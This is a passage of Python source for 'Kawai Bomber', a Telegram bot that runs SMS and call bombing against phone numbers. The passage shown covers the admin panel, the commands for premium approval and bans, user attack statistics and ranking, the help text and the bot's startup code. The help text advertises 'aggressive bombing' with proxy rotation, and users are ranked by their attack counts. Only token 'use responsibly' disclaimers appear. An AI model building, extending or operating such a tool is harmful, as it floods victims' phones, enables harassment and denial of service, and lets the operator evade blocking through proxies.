├─ {EMOJIS['total']} <b>Total Attacks:</b> {total_attacks}
└─ {EMOJIS['rank']} <b>Global Rank:</b> Top {total_attacks // 10 + 1}%

{EMOJIS['permissions']} <b>Permissions:</b>
├─ {EMOJIS['admin']} <b>Admin:</b> {'Yes' if user_id in ADMIN_IDS else 'No'}
├─ {EMOJIS['premium']} <b>Premium:</b> {'Yes' if user_id in APPROVED_USERS else 'No'}
├─ {EMOJIS['banned']} <b>Banned:</b> {'Yes' if user_id in BANNED_USERS else 'No'}
└─ {EMOJIS['limit']} <b>Time Limit:</b> {'None' if user_id in APPROVED_USERS else '60 min'}

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['fire']} <i>Keep bombing to increase your rank!</i>
"""
    
    await update.message.reply_text(
        mystats_text,
        parse_mode=ParseMode.HTML
    )

# ==================== ADMIN COMMANDS ====================
async def admin_panel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show admin panel"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>Access denied!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    admin_text = f"""
{EMOJIS['admin']} <b>ADMIN CONTROL PANEL</b> {EMOJIS['admin']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['stats']} <b>System Overview:</b>
├─ {EMOJIS['users']} <b>Total Users:</b> {len(USER_DB)}
├─ {EMOJIS['active']} <b>Active Bombs:</b> {len(active_bombs)}
├─ {EMOJIS['approved']} <b>Approved Users:</b> {len(APPROVED_USERS)}
└─ {EMOJIS['banned']} <b>Banned Users:</b> {len(BANNED_USERS)}

{EMOJIS['commands']} <b>Admin Commands:</b>
• /addadmin <user_id> - Add new admin
• /removeadmin <user_id> - Remove admin
• /approve <user_id> - Approve user (unlimited time)
• /removeuser <user_id> - Remove approval
• /ban <user_id> - Ban user from bot
• /unban <user_id> - Unban user
• /broadcast <message> - Send message to all users
• /userinfo <user_id> - Get user information
• /sysinfo - System information

{EMOJIS['quick']} <b>Quick Actions:</b>
• /restart - Restart bot
• /cleanup - Clean inactive sessions
• /backup - Backup user data

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['warning']} <i>Use commands responsibly!</i>
"""
    
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['users']} User List", callback_data="admin_users"),
            InlineKeyboardButton(f"{EMOJIS['stats']} Detailed Stats", callback_data="admin_stats")
        ],
        [
            InlineKeyboardButton(f"{EMOJIS['broadcast']} Broadcast", callback_data="admin_broadcast"),
            InlineKeyboardButton(f"{EMOJIS['settings']} Settings", callback_data="admin_settings")
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        admin_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add admin"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /addadmin <user_id>"
        )
        return
    
    try:
        new_admin_id = int(context.args[0])
        ADMIN_IDS.add(new_admin_id)
        
        await update.message.reply_text(
            f"{EMOJIS['success']} <b>Successfully added user {new_admin_id} as admin!</b>",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID!"
        )

async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove admin"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /removeadmin <user_id>"
        )
        return
    
    try:
        admin_id = int(context.args[0])
        if admin_id in ADMIN_IDS and admin_id != 8291098446:  # Can't remove main admin
            ADMIN_IDS.remove(admin_id)
            await update.message.reply_text(
                f"{EMOJIS['success']} <b>Removed admin privileges from user {admin_id}!</b>",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"{EMOJIS['error']} Cannot remove this admin!"
            )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID!"
        )

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve user (remove time limit)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /approve <user_id>"
        )
        return
    
    try:
        approve_id = int(context.args[0])
        APPROVED_USERS.add(approve_id)
        
        # Update user DB
        if approve_id in USER_DB:
            USER_DB[approve_id]["is_premium"] = True
        
        await update.message.reply_text(
            f"{EMOJIS['success']} <b>Approved user {approve_id}!</b>\n"
            f"They now have unlimited bombing time.",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID!"
        )

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user from approved list"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /removeuser <user_id>"
        )
        return
    
    try:
        remove_id = int(context.args[0])
        if remove_id in APPROVED_USERS:
            APPROVED_USERS.remove(remove_id)
            
            # Update user DB
            if remove_id in USER_DB:
                USER_DB[remove_id]["is_premium"] = False
            
            await update.message.reply_text(
                f"{EMOJIS['success']} <b>Removed approval from user {remove_id}!</b>",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"{EMOJIS['warning']} User {remove_id} was not approved!"
            )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID!"
        )

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban user from using bot"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /ban <user_id>"
        )
        return
    
    try:
        ban_id = int(context.args[0])
        BANNED_USERS.add(ban_id)
        
        # Stop any active bombing
        if ban_id in active_bombs:
            del active_bombs[ban_id]
            bot_stats["active_bombs"] = max(0, bot_stats["active_bombs"] - 1)
        
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>Banned user {ban_id}!</b>\n"
            f"They can no longer use the bot.",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID!"
        )

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban user"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /unban <user_id>"
        )
        return
    
    try:
        unban_id = int(context.args[0])
        if unban_id in BANNED_USERS:
            BANNED_USERS.remove(unban_id)
            
            await update.message.reply_text(
                f"{EMOJIS['unban']} <b>Unbanned user {unban_id}!</b>\n"
                f"They can now use the bot again.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"{EMOJIS['warning']} User {unban_id} was not banned!"
            )
    except ValueError:
        await update.message.reply_text(
            f"{EMOJIS['error']} Invalid user ID!"
        )

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text(
            f"{EMOJIS['error']} Usage: /broadcast <message>"
        )
        return
    
    message = " ".join(context.args)
    
    # In production, you would broadcast to all stored user IDs
    # For now, we'll just confirm
    await update.message.reply_text(
        f"{EMOJIS['zap']} <b>Broadcast prepared!</b>\n\n"
        f"Message: {message}\n\n"
        f"Would be sent to {len(USER_DB)} users.",
        parse_mode=ParseMode.HTML
    )

async def sysinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show system information"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    import psutil
    import platform
    
    # Get system info
    cpu_percent = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    sysinfo_text = f"""
{EMOJIS['server']} <b>SYSTEM INFORMATION</b> {EMOJIS['server']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['cpu']} <b>CPU Usage:</b> {cpu_percent}%
{EMOJIS['memory']} <b>Memory Usage:</b> {memory.percent}% ({memory.used//1024//1024}MB/{memory.total//1024//1024}MB)
{EMOJIS['disk']} <b>Disk Usage:</b> {disk.percent}% ({disk.used//1024//1024}MB/{disk.total//1024//1024}MB)

{EMOJIS['os']} <b>OS:</b> {platform.system()} {platform.release()}
{EMOJIS['python']} <b>Python:</b> {platform.python_version()}

{EMOJIS['bot']} <b>Bot Status:</b>
├─ {EMOJIS['users']} <b>Users:</b> {len(USER_DB)}
├─ {EMOJIS['active']} <b>Active:</b> {len(active_bombs)}
├─ {EMOJIS['proxies']} <b>Proxies:</b> {len(PROXY_LIST)}
└─ {EMOJIS['apis']} <b>APIs:</b> {len(APIS)}

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['time']} <i>Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
"""
    
    await update.message.reply_text(
        sysinfo_text,
        parse_mode=ParseMode.HTML
    )

# ==================== BUTTON HANDLERS ====================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if data == "start_bomb":
        await bomb_command(update, context)
    
    elif data == "show_stats":
        await status_command(update, context)
    
    elif data == "quick_start":
        # Quick start with random number (demo only)
        await query.edit_message_text(
            f"{EMOJIS['warning']} <b>Quick Start Disabled</b>\n\n"
            f"For safety, please use /bomb command to specify target.",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "help_menu":
        await help_command(update, context)
    
    elif data == "admin_panel":
        if user_id in ADMIN_IDS:
            await admin_panel_cmd(update, context)
        else:
            await query.answer("Access denied!", show_alert=True)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help menu"""
    help_text = f"""
{EMOJIS['help']} <b>KAWAI BOMBER HELP</b> {EMOJIS['help']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['commands']} <b>User Commands:</b>
• /start - Start the bot
• /bomb - Start bombing session
• /stop - Stop active bombing
• /status - Bot statistics
• /mystats - Your personal stats
• /help - Show this help

{EMOJIS['warning']} <b>Important Notes:</b>
• Free users have 60-minute time limit
• Premium users have unlimited time
• Use responsibly and ethically
• Don't target unauthorized numbers

{EMOJIS['features']} <b>Features:</b>
• Fast and aggressive bombing
• Proxy rotation (40+ proxies)
• SMS and Call bombing
• Real-time statistics
• User ranking system

{EMOJIS['support']} <b>Support:</b>
For issues or questions, contact @zerocyph

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Made by @zerocyph</i>
"""
    
    await update.message.reply_text(
        help_text,
        parse_mode=ParseMode.HTML
    )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel any conversation"""
    await update.message.reply_text(
        f"{EMOJIS['success']} <b>Operation cancelled!</b>",
        parse_mode=ParseMode.HTML
    )
    return ConversationHandler.END

# ==================== ERROR HANDLER ====================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Error: {context.error}")
    
    if update and update.effective_message:
        await update.effective_message.reply_text(
            f"{EMOJIS['error']} <b>An error occurred!</b>\n"
            f"Please try again later.",
            parse_mode=ParseMode.HTML
        )

# ==================== MAIN FUNCTION ====================
def main():
    """Start the bot"""
    print(BANNER)
    print(f"{EMOJIS['sparkles']} Kawai Bomber is starting...")
    print(f"{EMOJIS['heart']} Made by @zerocyph")
    print(f"{EMOJIS['power']} Bot Token: {BOT_TOKEN[:10]}...")
    
    # Create Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add conversation handler for bombing
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("bomb", bomb_command)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
            CONFIRM: [CallbackQueryHandler(handle_confirm, pattern="^(confirm_yes|confirm_no)$")],
            BOMB_TYPE: [CallbackQueryHandler(handle_bomb_type, pattern="^type_")]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    )
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Admin command handlers
    application.add_handler(CommandHandler("admin", admin_panel_cmd))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("removeadmin", removeadmin_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("removeuser", removeuser_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("sysinfo", sysinfo_command))
    
    # Add conversation handler
    application.add_handler(conv_handler)
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start the bot
    print(f"\n{EMOJIS['rocket']} Bot is running...")
    print(f"{EMOJIS['star']} Press Ctrl+C to stop")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
